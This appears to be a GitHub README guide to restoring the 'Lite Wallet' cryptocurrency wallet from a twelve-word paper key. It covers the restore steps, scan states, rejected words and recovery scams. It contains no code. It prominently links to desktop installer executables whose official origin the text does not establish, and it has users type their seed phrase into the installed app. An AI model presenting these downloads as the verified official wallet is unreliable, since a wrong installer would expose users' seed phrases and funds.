![Lite Wallet](assets/banner-article.png)

# Restore Lite Wallet from your paper key

The restore sequence, the rejected word, and the zero balance that follows.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Restoring means installing Lite Wallet on a device, choosing the restore option, and entering the twelve words in order. The wallet then rescans the chain and the balance reappears as the scan reaches the relevant blocks. Restore is possible only with the paper key; without it, nothing can bring a wallet back.

## What a restore actually does

A restore does not download your wallet from anywhere. It rebuilds it. The twelve words derive the same addresses as before, and the wallet then reads the public chain to find the transactions those addresses have received. Nothing private is transmitted, and no server is involved beyond the ordinary relay that broadcasts and fetches blocks.

That is why a restore is not instant. The wallet knows which addresses to look for, but it does not know how far back their history goes, so it scans. On a wallet with years of history the scan is the long part; the words take a minute.

## Step by step

1. Install the current release on the new device from [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
2. Choose restore rather than create a new wallet.
3. Enter the twelve words in the original order, one per field.
4. Confirm; the wallet derives the addresses and starts scanning.
5. Wait for the scan to finish before judging the balance.
6. Compare the first receiving address with the one you sent to before.
7. Send a small test amount only after the balance has appeared.

The comparison in step six is the part people skip. If the address does not match what you used before, the phrase was entered wrong, or it belongs to a different wallet, and no amount of waiting will fix that.

## What you will see while it scans

| State | What it looks like | What it means |
|---|---|---|
| restoring | setup completes, balance zero | addresses derived, scan starting |
| scanning | progress indicator, balance partial or zero | blocks being read |
| caught up | balance matches expectations | history rebuilt |
| stalled | progress frozen | peer or connection problem, not a wrong phrase |
| persistently wrong address | an address you do not recognise | wrong words, wrong order, or a different wallet's phrase |

A zero balance immediately after a restore is normal, not a failure. It becomes a problem only when the scan has finished and the balance is still wrong - and even then the usual cause is a phrase entered in the wrong order, not a lost wallet.

## Why the app asks for words instead of a login

New users read the restore screen as a login form and conclude the wallet wants a password. It does not: there is no account. A screen asking for twelve words is the app offering to rebuild a wallet, because it has no other way to know which wallet you mean.

If the wallet is already installed and working, you are on the wrong screen. The backup lives behind your PIN in the security area, not in the restore flow. [The no-login explainer](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/why-litewallet-has-no-login.md) explains the absence of accounts, and *the paper key guide* covers where the phrase is stored.

## A word is rejected, or the phrase will not proceed

| Symptom | Cause | Fix |
|---|---|---|
| one word refused | typo or a word outside the BIP-39 list | check the paper copy letter by letter |
| phrase accepted, empty wallet | scan still running | wait; see *the sync troubleshooting guide* |
| phrase accepted, different addresses | wrong order or another wallet's phrase | re-enter in the original order |
| phrase works here, not elsewhere | different derivation scheme | see [the seed portability guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-seed-in-another-wallet.md) |
| "invalid phrase" | a missing or duplicated word | count the words; there must be twelve |

BIP-39 has a fixed word list and no variants. "Colour" and "color" are different words; a plural is a different word; an abbreviation is not a word at all. The fix is always the paper copy, never a guess.

## Can a wallet be recovered without the paper key?

No. There is no server-side copy, no support override and no recovery service that can reconstruct a phrase from a partial one. Anything advertising that service is a scam, and the common version asks for the words you do have, which hands over the wallet.

The related trap is an old or unofficial "recovery" page. Recovery happens inside the app, from words you hold. A site that offers to check a phrase for you is asking you to disclose the wallet, and no legitimate check requires that. [The support and real-app guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/confirm-real-litewallet-app-support.md) covers what real support will and will not ask for.

## Restoring an old wallet you just found

A phrase from years ago restores fine; the chain has the history. What it will not do is produce an instantly correct balance, because the scan has to cover the period since the wallet was last used. Expect it to take longer than a fresh wallet's first sync, and expect the wallet to show zero until it catches up.

Two things are worth checking before you assume the worst: that the phrase is twelve words and not a 24-word phrase from another product, and that the wallet you are restoring is Lite Wallet rather than a similarly named app that derives addresses differently.

## The first ten minutes after a restore

The instinct after a restore is to check the balance, and the balance is the last thing to become correct. A better order for the first ten minutes is: confirm the address, confirm the scan is running, then wait.

Confirming the address takes seconds and settles the important question. If the first receiving address matches one you used before the restore, the phrase is right and the wallet is the right wallet; everything that follows is patience. If it does not match, the phrase is wrong or belongs elsewhere, and waiting will not change that.

Confirming the scan is running means looking at the indicator and the peer list rather than the balance. A scan with peers and moving progress is healthy even when the number is small. A scan with no peers needs the network checks before anything else.

Then wait, with the device plugged in and the app in the foreground. The balance fills in as the scan reaches the relevant blocks, and the point at which it becomes correct is the point at which the restore is finished. Judging earlier than that is how a working wallet gets reinstalled for no reason.

## FAQ

### How long does a restore take?

The words take a minute; the scan decides the rest. A wallet with a short history can be caught up in minutes; one with years of activity takes longer, and the app shows progress rather than a countdown.

### Why is my balance zero after restoring?

Because the scan has not reached the funding transactions yet. Confirm on a block explorer that the coins are at your address, then let the scan finish. A restored wallet is not broken because it starts at zero.

### What if the app rejects one of my words?

That word is misspelled or is not on the BIP-39 list. Check your paper copy letter by letter. There are no accepted variants, and autocomplete should not be trusted with a phrase you are reading from paper.

### Can I restore without the twelve words?

No. There is no account to reset and no server copy to request. Without the phrase the wallet is unrecoverable, and any service claiming otherwise is trying to obtain your words.

### Is it safe to restore on a borrowed computer?

Only if you trust the machine completely. A restore types your phrase into that device, where malware or a keylogger would capture it. Restore on hardware you control, then wipe any temporary device you used.

Restore works the same on every platform in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
